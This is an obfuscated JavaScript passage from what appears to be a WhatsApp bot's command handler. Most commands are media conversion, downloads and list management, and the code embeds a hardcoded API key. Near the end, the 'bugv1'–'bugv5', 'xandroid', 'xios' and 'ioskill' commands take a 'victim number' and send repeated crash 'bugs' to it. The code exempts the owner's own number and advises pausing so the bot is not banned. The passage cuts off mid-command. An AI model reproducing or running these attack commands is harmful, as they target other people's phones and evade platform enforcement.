          _0x486fbc.sendMessage(_0xa01f7.chat, {
            'audio': _0x14b42e,
            'mimetype': 'audio/mpeg',
            'ptt': true
          }, {
            'quoted': _0xa01f7
          });
        }
        break;
      case "togif":
        {
          if (!/webp/.test(_0x276cde)) {
            return _0x5264ea("Reply sticker with caption *" + (_0x4ca7f9 + _0x4210ff) + '*');
          }
          _0x5264ea(mess.wait);
          let _0x14e833 = await _0x486fbc.downloadAndSaveMediaMessage(_0x5a97f9);
          let _0x4af8e9 = await webp2mp4File(_0x14e833);
          await _0x486fbc.sendMessage(_0xa01f7.chat, {
            'video': {
              'url': _0x4af8e9.result,
              'caption': "Convert Webp To Video"
            },
            'gifPlayback': true
          }, {
            'quoted': _0xa01f7
          });
          await fs.unlinkSync(_0x14e833);
        }
        break;
      case "tourl":
        {
          _0x5264ea(mess.wait);
          let _0x178c2f = await _0x486fbc.downloadAndSaveMediaMessage(_0x5a97f9);
          if (/image/.test(_0x276cde)) {
            let _0x30e2cd = await TelegraPh(_0x178c2f);
            _0x5264ea(util.format(_0x30e2cd));
          } else {
            if (!/image/.test(_0x276cde)) {
              let _0x21714c = await UploadFileUgu(_0x178c2f);
              _0x5264ea(util.format(_0x21714c));
            }
          }
          await fs.unlinkSync(_0x178c2f);
        }
        break;
      case 'emojimix':
        {
          let [_0x4e0100, _0x1a2cf6] = _0x327751.split`+`;
          if (!_0x4e0100) {
            return _0x5264ea("Example : " + (_0x4ca7f9 + _0x4210ff) + " 😅+🤔");
          }
          if (!_0x1a2cf6) {
            return _0x5264ea("Example : " + (_0x4ca7f9 + _0x4210ff) + " 😅+🤔");
          }
          _0x5264ea(mess.wait);
          let _0x52ac07 = await fetchJson('https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=' + encodeURIComponent(_0x4e0100) + '_' + encodeURIComponent(_0x1a2cf6));
          for (let _0x5e7f97 of _0x52ac07.results) {
            let _0x1b52f1 = await _0x486fbc.sendImageAsSticker(_0xa01f7.chat, _0x5e7f97.url, _0xa01f7, {
              'packname': global.packname,
              'author': global.author,
              'categories': _0x5e7f97.tags
            });
            await fs.unlinkSync(_0x1b52f1);
          }
        }
        break;
      case "toonce":
      case "toviewonce":
        {
          if (!_0x166763) {
            return _0x5264ea("Reply Image/Video");
          }
          if (/image/.test(_0x276cde)) {
            anuan = await _0x486fbc.downloadAndSaveMediaMessage(_0x166763);
            _0x486fbc.sendMessage(_0xa01f7.chat, {
              'image': {
                'url': anuan
              },
              'caption': "Here you go!",
              'fileLength': "999",
              'viewOnce': true
            }, {
              'quoted': _0xa01f7
            });
          } else if (/video/.test(_0x276cde)) {
            anuanuan = await _0x486fbc.downloadAndSaveMediaMessage(_0x166763);
            _0x486fbc.sendMessage(_0xa01f7.chat, {
              'video': {
                'url': anuanuan
              },
              'caption': "Here you go!",
              'fileLength': "99999999",
              'viewOnce': true
            }, {
              'quoted': _0xa01f7
            });
          }
        }
        break;
      case "toqr":
        {
          if (!q) {
            return _0x5264ea(" Please include link or text!");
          }
          const _0x30c63b = require("qrcode");
          let _0x2f5423 = await _0x30c63b.toDataURL(q, {
            'scale': 0x23
          });
          let _0x4d607 = new Buffer.from(_0x2f5423.replace("data:image/png;base64,", ''), 'base64');
          let _0x14f896 = getRandom('.jpg');
          await fs.writeFileSync('./' + _0x14f896, _0x4d607);
          let _0x3fc273 = fs.readFileSync('./' + _0x14f896);
          await _0x486fbc.sendMessage(_0x1c6c8b, {
            'image': _0x3fc273,
            'caption': "Here you go!"
          }, {
            'quoted': _0xa01f7
          });
          setTimeout(() => {
            fs.unlinkSync(_0x14f896);
          }, 0x2710);
        }
        break;
      case "fliptext":
        {
          if (_0x1541ad.length < 0x1) {
            return _0x5264ea("Example:\n" + _0x4ca7f9 + "fliptext toge");
          }
          quere = _0x1541ad.join(" ");
          flipe = quere.split('').reverse().join('');
          _0x5264ea("```「 FLIP TEXT 」```\n*•> Normal :*\n" + quere + "\n*•> Flip :*\n" + flipe);
        }
        break;
      case "listvn":
        {
          let _0x1e95e3 = "┌──⭓「 *List Vn* 」\n│\n";
          for (let _0x42aa79 of VoiceNoteXeon) {
            _0x1e95e3 += "│⭔ " + _0x42aa79 + "\n";
          }
          _0x1e95e3 += "│\n└────────────⭓\n\n*Total : " + VoiceNoteXeon.length + '*';
          _0x5264ea(_0x1e95e3);
        }
        break;
      case 'liststicker':
        {
          let _0x3b4911 = "┌──⭓「 *List Sticker* 」\n│\n";
          for (let _0x579a3f of StickerXeon) {
            _0x3b4911 += "│⭔ " + _0x579a3f + "\n";
          }
          _0x3b4911 += "│\n└────────────⭓\n\n*Total : " + StickerXeon.length + '*';
          _0x5264ea(_0x3b4911);
        }
        break;
      case "listimage":
        {
          let _0x2c0115 = "┌──⭓「 *List Image* 」\n│\n";
          for (let _0x44d3b0 of ImageXeon) {
            _0x2c0115 += "│⭔ " + _0x44d3b0 + "\n";
          }
          _0x2c0115 += "│\n└────────────⭓\n\n*Total : " + ImageXeon.length + '*';
          _0x5264ea(_0x2c0115);
        }
        break;
      case "listvideo":
        {
          let _0x36111e = "┌──⭓「 *List Video* 」\n│\n";
          for (let _0x51674b of VideoXeon) {
            _0x36111e += "│⭔ " + _0x51674b + "\n";
          }
          _0x36111e += "│\n└────────────⭓\n\n*Total : " + VideoXeon.length + '*';
          _0x5264ea(_0x36111e);
        }
        break;
      case "addowner":
        if (!_0x36f85a) {
          return _0x5264ea(mess.owner);
        }
        if (!_0x1541ad[0x0]) {
          return _0x5264ea("Use " + (_0x4ca7f9 + _0x4210ff) + " number\nExample " + (_0x4ca7f9 + _0x4210ff) + " " + ownernumber);
        }
        bnnd = q.split('|')[0x0].replace(/[^0-9]/g, '');
        let _0x52d843 = await _0x486fbc.onWhatsApp(bnnd);
        if (_0x52d843.length == 0x0) {
          return _0x5264ea("Enter A Valid And Registered Number On WhatsApp!!!");
        }
        owner.push(bnnd);
        fs.writeFileSync("./lib/database/owner.json", JSON.stringify(owner));
        _0x5264ea("Number " + bnnd + " Has Become An Owner!!!");
        break;
      case "delowner":
        if (!_0x36f85a) {
          return _0x5264ea(mess.owner);
        }
        if (!_0x1541ad[0x0]) {
          return _0x5264ea("Use " + (_0x4ca7f9 + _0x4210ff) + " nomor\nExample " + (_0x4ca7f9 + _0x4210ff) + " 24102150169");
        }
        ya = q.split('|')[0x0].replace(/[^0-9]/g, '');
        unp = owner.indexOf(ya);
        owner.splice(unp, 0x1);
        fs.writeFileSync("./lib/database/owner.json", JSON.stringify(owner));
        _0x5264ea("The Numbrr " + ya + " Has been deleted from owner list by the owner!!!");
        break;
      case "addvideo":
        {
          if (!_0x57f102) {
            return _0x5264ea(mess.prem);
          }
          if (_0x1541ad.length < 0x1) {
            return _0x5264ea("Video Name?");
          }
          if (VideoXeon.includes(q)) {
            return _0x5264ea("The name you entered already exists");
          }
          let _0x20bd1f = await _0x486fbc.downloadAndSaveMediaMessage(_0x166763);
          VideoXeon.push(q);
          await fsx.copy(_0x20bd1f, "./lib/Media/video/" + q + '.mp4');
          fs.writeFileSync("./lib/database/auto_reply/video.json", JSON.stringify(VideoXeon));
          fs.unlinkSync(_0x20bd1f);
          _0x5264ea("Success Adding VideoTo View Type " + _0x4ca7f9 + 'listvideo');
        }
        break;
      case "delvideo":
        {
          if (!_0x57f102) {
            return _0x5264ea(mess.prem);
          }
          if (_0x1541ad.length < 0x1) {
            return _0x5264ea("Enter the Video Name");
          }
          if (!VideoXeon.includes(q)) {
            return _0x5264ea("Name Does Not Exist in Database");
          }
          let _0x441e79 = VideoXeon.indexOf(q);
          VideoXeon.splice(_0x441e79, 0x1);
          fs.writeFileSync("./lib/database/auto_reply/video.json", JSON.stringify(VideoXeon));
          fs.unlinkSync("./lib/Media/video/" + q + ".mp4");
          _0x5264ea("Successfully Deleted Video " + q);
        }
        break;
      case "addimage":
        {
          if (!_0x57f102) {
            return _0x5264ea(mess.prem);
          }
          if (_0x1541ad.length < 0x1) {
            return _0x5264ea("The name of the image?");
          }
          if (ImageXeon.includes(q)) {
            return _0x5264ea("The name you entered is already registered in the database");
          }
          let _0x28d8ee = await _0x486fbc.downloadAndSaveMediaMessage(_0x166763);
          ImageXeon.push(q);
          await fsx.copy(_0x28d8ee, "./lib/Media/image/" + q + ".jpg");
          fs.writeFileSync("./lib/database/auto_reply/image.json", JSON.stringify(ImageXeon));
          fs.unlinkSync(_0x28d8ee);
          _0x5264ea("Success In Adding Image\nTo Check Type " + _0x4ca7f9 + "listimage");
        }
        break;
      case "delimage":
        {
          if (!_0x57f102) {
            return _0x5264ea(mess.prem);
          }
          if (_0x1541ad.length < 0x1) {
            return _0x5264ea("Enter the Image Name");
          }
          if (!ImageXeon.includes(q)) {
            return _0x5264ea("The image name you entered is not registered");
          }
          let _0x407c0d = ImageXeon.indexOf(q);
          ImageXeon.splice(_0x407c0d, 0x1);
          fs.writeFileSync("./lib/database/autoreply/image.json", JSON.stringify(ImageXeon));
          fs.unlinkSync("./lib/Media/image/" + q + ".jpg");
          _0x5264ea("Successfully Deleted Image " + q);
        }
        break;
      case "addsticker":
        {
          if (!_0x57f102) {
            return _0x5264ea(mess.prem);
          }
          if (_0x1541ad.length < 0x1) {
            return _0x5264ea("Enter the name of the sticker?");
          }
          if (StickerXeon.includes(q)) {
            return _0x5264ea("Name Already In Use");
          }
          let _0x3ee65a = await _0x486fbc.downloadAndSaveMediaMessage(_0x166763);
          StickerXeon.push(q);
          await fsx.copy(_0x3ee65a, './lib/Media/sticker/' + q + '.webp');
          fs.writeFileSync("./lib/database/auto_reply/sticker.json", JSON.stringify(StickerXeon));
          fs.unlinkSync(_0x3ee65a);
          _0x5264ea("Successfully Adding StickerTo Check Type " + _0x4ca7f9 + "liststicker");
        }
        break;
      case "delsticker":
        {
          if (!_0x57f102) {
            return _0x5264ea(mess.prem);
          }
          if (_0x1541ad.length < 0x1) {
            return _0x5264ea("Enter the name of the sticker");
          }
          if (!StickerXeon.includes(q)) {
            return _0x5264ea("Name Not Registered in Database");
          }
          let _0x4e876d = StickerXeon.indexOf(q);
          StickerXeonBotInc.splice(_0x4e876d, 0x1);
          fs.writeFileSync("./lib/database/auto_reply/sticker.json", JSON.stringify(StickerXeon));
          fs.unlinkSync("./lib/Media/sticker/" + q + ".webp");
          _0x5264ea("Successfully Removed Sticker " + q);
        }
        break;
      case "addvn":
        {
          if (!_0x57f102) {
            return _0x5264ea(mess.prem);
          }
          if (_0x1541ad.length < 0x1) {
            return _0x5264ea("Enter the Name?");
          }
          if (VoiceNoteXeon.includes(q)) {
            return _0x5264ea("Name Already In Use");
          }
          let _0x44d22b = await _0x486fbc.downloadAndSaveMediaMessage(_0x166763);
          VoiceNoteXeon.push(q);
          await fsx.copy(_0x44d22b, "./lib/Media/audio/" + q + ".mp3");
          fs.writeFileSync("./lib/database/auto_reply/vn.json", JSON.stringify(VoiceNoteXeon));
          fs.unlinkSync(_0x44d22b);
          _0x5264ea("Success Adding Audio\nTo Check Type " + _0x4ca7f9 + "listvn");
        }
        break;
      case "delvn":
        {
          if (!_0x57f102) {
            return _0x5264ea(mess.prem);
          }
          if (_0x1541ad.length < 0x1) {
            return _0x5264ea("Enter the Name");
          }
          if (!VoiceNoteXeon.includes(q)) {
            return _0x5264ea("Name Not Registered in Database");
          }
          let _0xfe03f6 = VoiceNoteXeon.indexOf(q);
          VoiceNoteXeon.splice(_0xfe03f6, 0x1);
          fs.writeFileSync("./lib/database/auto_reply/vn.json", JSON.stringify(VoiceNoteXeon));
          fs.unlinkSync("./lib/Media/audio/" + q + ".mp3");
          _0x5264ea("Successfully Deleted Audio " + q);
        }
        break;
      case "addzip":
        {
          if (!_0x57f102) {
            return _0x5264ea(mess.prem);
          }
          await _0x46ee79();
          if (_0x1541ad.length < 0x1) {
            return _0x5264ea("What's the zip name?");
          }
          let _0x49d4fd = '' + _0x327751;
          {
            if (ZipXeon.includes(_0x49d4fd)) {
              return _0x5264ea("This name is already in use");
            }
            let _0x30ecaa = await _0x486fbc.downloadAndSaveMediaMessage(_0x166763);
            ZipXeon.push(_0x49d4fd);
            await fsx.copy(_0x30ecaa, "./lib/Media/zip/" + _0x49d4fd + ".zip");
            fs.writeFileSync("./lib/database/auto_reply/zip.json", JSON.stringify(ZipXeon));
            fs.unlinkSync(_0x30ecaa);
            _0x5264ea("Success Adding zip\nTo check type " + _0x4ca7f9 + "listzip");
          }
        }
        break;
      case "delzip":
        {
          if (!_0x57f102) {
            return _0x5264ea(mess.prem);
          }
          await _0x46ee79();
          if (_0x1541ad.length < 0x1) {
            return _0x5264ea("Enter the text in the zip list");
          }
          let _0x4b5e81 = '' + _0x327751;
          {
            if (!ZipXeon.includes(_0x4b5e81)) {
              return _0x5264ea("This name does not exist in the database");
            }
            let _0x419cda = ZipXeon.indexOf(_0x4b5e81);
            ZipXeon.splice(_0x419cda, 0x1);
            fs.writeFileSync('./lib/database/auto_reply/zip.json', JSON.stringify(ZipXeon));
            fs.unlinkSync("./lib/Media/zip/" + _0x4b5e81 + '.zip');
            _0x5264ea("Successfully deleted zip " + _0x4b5e81);
          }
        }
        break;
      case "listzip":
        {
          await _0x46ee79();
          let _0x1f8d02 = "┌──⭓「 *ZIP LIST* 」\n│\n";
          for (let _0x3f0982 of ZipXeon) {
            _0x1f8d02 += "│⭔ " + _0x3f0982 + "\n";
          }
          _0x1f8d02 += "│\n└────────────⭓\n\n*Total : " + ZipXeon.length + '*';
          _0x5264ea(_0x1f8d02);
        }
        break;
      case 'addapk':
        {
          if (!_0x57f102) {
            return _0x5264ea(mess.prem);
          }
          await _0x46ee79();
          if (_0x1541ad.length < 0x1) {
            return _0x5264ea("What is the name of the apk?");
          }
          let _0x18f5ae = '' + _0x327751;
          {
            if (ApkXeon.includes(_0x18f5ae)) {
              return _0x5264ea("This name is already in use");
            }
            let _0x3eeca2 = await _0x486fbc.downloadAndSaveMediaMessage(_0x166763);
            apknye.push(_0x18f5ae);
            await fsx.copy(_0x3eeca2, './lib/Media/apk/' + _0x18f5ae + '.apk');
            fs.writeFileSync("./lib/database/auto_reply/apk.json", JSON.stringify(ApkXeon));
            fs.unlinkSync(_0x3eeca2);
            _0x5264ea("Successful Adding apk\nTo Check type " + _0x4ca7f9 + "listapk");
          }
        }
        break;
      case "delapk":
        {
          if (!_0x57f102) {
            return _0x5264ea(mess.prem);
          }
          await _0x46ee79();
          if (_0x1541ad.length < 0x1) {
            return _0x5264ea("Name of the apk?");
          }
          let _0x6be6db = '' + _0x327751;
          {
            if (!ApkXeon.includes(_0x6be6db)) {
              return _0x5264ea("This name does not exist in the database");
            }
            let _0x4b5898 = ApkXeon.indexOf(_0x6be6db);
            ApkXeon.splice(_0x4b5898, 0x1);
            fs.writeFileSync("./lib/database/auto_reply/apk.json", JSON.stringify(ApkXeon));
            fs.unlinkSync("./lib/Media/apk/" + _0x6be6db + ".apk");
            _0x5264ea("Successfully deleted Apk " + _0x6be6db);
          }
        }
        break;
      case "listapk":
        {
          await _0x46ee79();
          let _0x41f9d5 = "┌──⭓「 *APK LIST* 」\n│\n";
          for (let _0x546507 of ApkXeon) {
            _0x41f9d5 += "│⭔ " + _0x546507 + "\n";
          }
          _0x41f9d5 += "│\n└────────────⭓\n\n*Total : " + ApkXeon.length;
          _0x5264ea(_0x41f9d5);
        }
        break;
      case 'addpdf':
        {
          if (!_0x57f102) {
            return _0x5264ea(mess.prem);
          }
          await _0x46ee79();
          if (_0x1541ad.length < 0x1) {
            return _0x5264ea("What is the name of the pdf");
          }
          let _0x507ef2 = '' + _0x327751;
          {
            if (DocXeon.includes(_0x507ef2)) {
              return _0x5264ea("This name is already in use");
            }
            let _0x1bdffd = await _0x486fbc.downloadAndSaveMediaMessage(_0x166763);
            docunye.push(_0x507ef2);
            await fsx.copy(_0x1bdffd, "./lib/Media/doc/" + _0x507ef2 + ".pdf");
            fs.writeFileSync("./lib/database/autoreply/doc.json", JSON.stringify(DocXeon));
            fs.unlinkSync(_0x1bdffd);
            _0x5264ea("Successful Adding Pdf\nTo check type " + _0x4ca7f9 + 'listpdf');
          }
        }
        break;
      case "delpdf":
        {
          if (!_0x57f102) {
            return _0x5264ea(mess.prem);
          }
          await _0x46ee79();
          if (_0x1541ad.length < 0x1) {
            return _0x5264ea("Enter the name");
          }
          let _0x53674c = '' + _0x327751;
          {
            if (!DocXeon.includes(_0x53674c)) {
              return _0x5264ea("This name does not exist in the database");
            }
            let _0xb134f0 = DocApk.indexOf(_0x53674c);
            docunye.splice(_0xb134f0, 0x1);
            fs.writeFileSync('./lib/database/autoreply/doc.json', JSON.stringify(DocXeon));
            fs.unlinkSync('./lib/Media/doc/' + _0x53674c + ".pdf");
            _0x5264ea("Successfully deleted pdf " + _0x53674c);
          }
        }
        break;
      case "listpdf":
        {
          await _0x46ee79();
          let _0x10df31 = "┌──⭓「 *PDF LIST* 」\n│\n";
          for (let _0xb58a31 of docunye) {
            _0x10df31 += "│⭔ " + _0xb58a31 + "\n";
          }
          _0x10df31 += "│\n└────────────⭓\n\n*Total : " + docunye.length + '*';
          _0x5264ea(_0x10df31);
        }
        break;
      case 'afk':
        if (!_0xa01f7.isGroup) {
          return _0x5264ea(mess.group);
        }
        if (_0x5a24c4) {
          return _0x5264ea("Already afk");
        }
        let _0xcc5786 = _0x327751 ? _0x327751 : "Nothing.";
        afk.addAfkUser(_0xa01f7.sender, Date.now(), _0xcc5786, _afk);
        _0x5264ea('@' + _0xa01f7.sender.split('@')[0x0] + " Currently AFK\nWith reason : " + _0xcc5786);
        break;
      case "play":
      case "song":
        {
          if (!_0x327751) {
            return _0x5264ea("Example : " + (_0x4ca7f9 + _0x4210ff) + " *anime song*");
          }
          const _0x59f714 = require("./lib/ytdl2");
          let _0x2d500a = require("youtube-yts");
          let _0x357856 = await _0x2d500a(_0x327751);
          let _0x3b4814 = _0x357856.videos[0x0];
          const _0x11c7af = await _0x59f714.mp3(_0x3b4814.url);
          await _0x486fbc.sendMessage(_0xa01f7.chat, {
            'audio': fs.readFileSync(_0x11c7af.path),
            'fileName': _0x3b4814.title + ".mp3",
            'mimetype': "audio/mp4",
            'ptt': true,
            'contextInfo': {
              'externalAdReply': {
                'title': _0x3b4814.title,
                'body': botname,
                'thumbnail': await fetchBuffer(_0x11c7af.meta.image),
                'mediaType': 0x2,
                'mediaUrl': _0x3b4814.url
              }
            }
          }, {
            'quoted': _0xa01f7
          });
          await fs.unlinkSync(_0x11c7af.path);
        }
        break;
      case "ytmp3":
      case 'ytaudio':
        const _0x5406fd = require("./lib/ytdl2");
        if (_0x1541ad.length < 0x1 || !isUrl(_0x327751) || !_0x5406fd.isYTUrl(_0x327751)) {
          return _0x5264ea("Where's the yt link?\nExample: " + (_0x4ca7f9 + _0x4210ff) + " https://youtube.com/shorts/YQf-vMjDuKY?feature=share");
        }
        const _0x493cad = await _0x5406fd.mp3(_0x327751);
        await _0x486fbc.sendMessage(_0xa01f7.chat, {
          'audio': fs.readFileSync(_0x493cad.path),
          'mimetype': "audio/mp4",
          'ptt': true,
          'contextInfo': {
            'externalAdReply': {
              'title': _0x493cad.meta.title,
              'body': botname,
              'thumbnail': await fetchBuffer(_0x493cad.meta.image),
              'mediaType': 0x2,
              'mediaUrl': _0x327751
            }
          }
        }, {
          'quoted': _0xa01f7
        });
        await fs.unlinkSync(_0x493cad.path);
        break;
      case 'ytmp4':
      case "ytvideo":
        {
          const _0x590042 = require("./lib/ytdl2");
          if (_0x1541ad.length < 0x1 || !isUrl(_0x327751) || !_0x590042.isYTUrl(_0x327751)) {
            _0x5264ea("Where is the link??\n\nExample : " + (_0x4ca7f9 + _0x4210ff) + " https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps");
          }
          const _0x47e4a5 = await _0x590042.mp4(_0x327751);
          const _0x53bed0 = "\n*" + themeemoji + "Tittle:* " + _0x47e4a5.title + "\n*" + themeemoji + "Date:* " + _0x47e4a5.date + "\n*" + themeemoji + "Duration:* " + _0x47e4a5.duration + "\n*" + themeemoji + "Quality:* " + _0x47e4a5.quality;
          await _0x486fbc.sendMessage(_0xa01f7.chat, {
            'video': {
              'url': _0x47e4a5.videoUrl
            },
            'caption': _0x53bed0
          }, {
            'quoted': _0xa01f7
          });
        }
        break;
      case "sound1":
      case 'sound2':
      case "sound3":
      case 'sound4':
      case "sound5":
      case "sound6":
      case "sound7":
      case "sound8":
      case 'sound9':
      case 'sound10':
      case "sound11":
      case "sound12":
      case "sound13":
      case "sound14":
      case "sound15":
      case "sound16":
      case "sound17":
      case "sound18":
      case "sound19":
      case "sound20":
      case "sound21":
      case "sound22":
      case "sound23":
      case "sound24":
      case "sound25":
      case 'sound26':
      case 'sound27':
      case "sound28":
      case "sound29":
      case "sound30":
      case "sound31":
      case 'sound32':
      case "sound33":
      case "sound34":
      case "sound35":
      case "sound36":
      case "sound37":
      case "sound38":
      case 'sound39':
      case "sound40":
      case 'sound41':
      case "sound42":
      case "sound43":
      case "sound44":
      case "sound45":
      case 'sound46':
      case "sound47":
      case "sound48":
      case "sound49":
      case "sound50":
      case 'sound51':
      case "sound52":
      case "sound53":
      case "sound54":
      case "sound55":
      case "sound56":
      case 'sound57':
      case "sound58":
      case "sound59":
      case "sound60":
      case "sound61":
      case "sound62":
      case "sound63":
      case "sound64":
      case "sound65":
      case "sound66":
      case 'sound67':
      case "sound68":
      case "sound69":
      case "sound70":
      case "sound71":
      case "sound72":
      case "sound73":
      case "sound74":
      case "sound75":
      case 'sound76':
      case "sound77":
      case 'sound78':
      case "sound79":
      case "sound80":
      case "sound81":
      case "sound82":
      case "sound83":
      case "sound84":
      case "sound85":
      case "sound86":
      case "sound87":
      case "sound88":
      case "sound89":
      case "sound90":
      case "sound91":
      case "sound92":
      case "sound93":
      case "sound94":
      case 'sound95':
      case "sound96":
      case "sound97":
      case "sound98":
      case 'sound99':
      case "sound100":
      case "sound101":
      case "sound102":
      case 'sound103':
      case "sound104":
      case "sound105":
      case "sound106":
      case "sound107":
      case 'sound108':
      case "sound109":
      case "sound110":
      case "sound111":
      case 'sound112':
      case 'sound113':
      case "sound114":
      case 'sound115':
      case "sound116":
      case "sound117":
      case "sound118":
      case "sound119":
      case "sound120":
      case "sound121":
      case "sound122":
      case "sound123":
      case "sound124":
      case "sound125":
      case "sound126":
      case "sound127":
      case "sound128":
      case "sound129":
      case 'sound130':
      case 'sound131':
      case "sound132":
      case "sound133":
      case "sound134":
      case "sound135":
      case "sound136":
      case "sound137":
      case "sound138":
      case "sound139":
      case "sound140":
      case "sound141":
      case 'sound142':
      case "sound143":
      case "sound144":
      case "sound145":
      case "sound146":
      case 'sound147':
      case 'sound148':
      case 'sound149':
      case "sound150":
      case "sound151":
      case "sound152":
      case 'sound153':
      case 'sound154':
      case "sound155":
      case 'sound156':
      case "sound157":
      case "sound158":
      case "sound159":
      case 'sound160':
      case "sound161":
        XeonBotInc_dev = await getBuffer("https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/" + _0x4210ff + '.mp3');
        await _0x486fbc.sendMessage(_0xa01f7.chat, {
          'audio': XeonBotInc_dev,
          'mimetype': "audio/mp4",
          'ptt': true
        }, {
          'quoted': _0xa01f7
        });
        break;
      case 'xandroid':
      case "bugv1":
      case "bugv2":
      case "bugv3":
      case "bugv4":
      case 'bugv5':
        {
          if (!_0x57f102) {
            return _0x5264ea(mess.prem);
          }
          if (!_0x327751) {
            return _0x5264ea("𝖀𝖘𝖊 " + (_0x4ca7f9 + _0x4210ff) + " 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 " + (_0x4ca7f9 + _0x4210ff) + " 241xxxxxxxxxx,5");
          }
          let _0x370927 = _0x327751.split(',')[0x0];
          let _0x5c62eb = _0x327751.split(',')[0x1] * 0x5;
          if (!_0x370927 || !_0x5c62eb) {
            return _0x5264ea("𝖀𝖘𝖊 " + (_0x4ca7f9 + _0x4210ff) + " 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 " + (_0x4ca7f9 + _0x4210ff) + " 241xxxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0x5c62eb))) {
            return _0x5264ea("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
          }
          let _0x203f9c = _0x370927.replace(/[^0-9]/g, '');
          let _0x27410b = '' + encodeURI(_0x5c62eb);
          var _0x9254ba = await _0x486fbc.onWhatsApp(_0x203f9c + "@s.whatsapp.net");
          let _0x2f6697 = _0x203f9c + '@s.whatsapp.net';
          if (_0x203f9c == "24102150169") {
            return;
          }
          if (_0x9254ba.length == 0x0) {
            return _0x5264ea("𝐓𝐡𝐞 𝐧𝐮𝐦𝐛𝐞𝐫 𝐢𝐬 𝐧𝐨𝐭 𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫𝐞𝐝 𝐨𝐧 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩");
          }
          _0x5264ea("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙, " + _0x4210ff + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘...");
          await sleep(0x7d0);
          _0x5edea5(_0x2f6697, _0x27410b);
          await sleep(0x9c4);
          _0xdb78f5("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + _0x2f6697.split('@')[0x0] + " 𝖀𝖘𝖎𝖓𝖌 *" + _0x4210ff + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉.", [_0x2f6697]);
        }
        break;
      case "xios":
        {
          if (!_0x57f102) {
            return _0x5264ea(mess.prem);
          }
          if (!_0x327751) {
            return _0x5264ea("𝖀𝖘𝖊 " + (_0x4ca7f9 + _0x4210ff) + " 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 " + (_0x4ca7f9 + _0x4210ff) + " 241xxxxxxxxxx,5");
          }
          let _0x239edd = _0x327751.split(',')[0x0];
          let _0xc65bb8 = _0x327751.split(',')[0x1] * 0x5;
          if (!_0x239edd || !_0xc65bb8) {
            return _0x5264ea("𝖀𝖘𝖊 " + (_0x4ca7f9 + _0x4210ff) + " 𝖛𝖎𝖈𝖙𝖎𝖒 𝖓𝖚𝖒𝖇𝖊𝖗|𝖆𝖒𝖔𝖚𝖓𝖙\n𝖊𝖝𝖊𝖒𝖕𝖑𝖊 " + (_0x4ca7f9 + _0x4210ff) + " 241xxxxxxxxxx,5");
          }
          if (isNaN(parseInt(_0xc65bb8))) {
            return _0x5264ea("𝕬𝖒𝖔𝖚𝖓𝖙 𝖒𝖚𝖘𝖙 𝖇𝖊 𝖆 𝖓𝖚𝖒𝖇𝖊𝖗");
          }
          let _0x49235b = _0x239edd.replace(/[^0-9]/g, '');
          let _0xea7a43 = '' + encodeURI(_0xc65bb8);
          var _0x9254ba = await _0x486fbc.onWhatsApp(_0x49235b + '@s.whatsapp.net');
          let _0x513797 = _0x49235b + "@s.whatsapp.net";
          if (_0x49235b == '24102150169') {
            return;
          }
          if (_0x9254ba.length == 0x0) {
            return _0x5264ea("𝐓𝐡𝐞 𝐧𝐮𝐦𝐛𝐞𝐫 𝐢𝐬 𝐧𝐨𝐭 𝐫𝐞𝐠𝐢𝐬𝐭𝐞𝐫𝐞𝐝 𝐨𝐧 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩");
          }
          _0x5264ea("𝖕𝖑𝖊𝖆𝖘𝖊 𝖜𝖆𝖎𝖙, " + _0x4210ff + " 𝖇𝖚𝖌 𝖎𝖘 𝖎𝖓 𝖕𝖗𝖔𝖈𝖊𝖘𝖘...");
          await sleep(0x7d0);
          _0xf9e938(_0x513797, _0xea7a43);
          await sleep(0x9c4);
          _0xdb78f5("𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐭 𝐁𝐮𝐠 𝐓𝐨 @" + _0x513797.split('@')[0x0] + " 𝖀𝖘𝖎𝖓𝖌 *" + _0x4210ff + "* ✅\n\n𝕻𝖆𝖚𝖘𝖊 2 𝖒𝖎𝖓𝖚𝖙𝖊𝖘 𝖘𝖔 𝖙𝖍𝖆𝖙 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖎𝖘 𝖓𝖔𝖙 𝖇𝖆𝖓𝖓𝖊𝖉.", [_0x513797]);
        }
        break;
      case 'xios2':
      case "ioskill":
      case "iosx":
        {
          if (!_0x57f102) {
            return _0x5264ea(mess.prem);
          }
          if (!_0x440a12) {
            return _0x5264ea("𝕿𝖍𝖎𝖘 𝖋𝖊𝖆𝖙𝖚𝖗𝖊 𝖎𝖘 𝖋𝖔𝖗 𝖙𝖍𝖊 𝖇𝖔𝖙 𝖔𝖓𝖑𝖞!");
          }
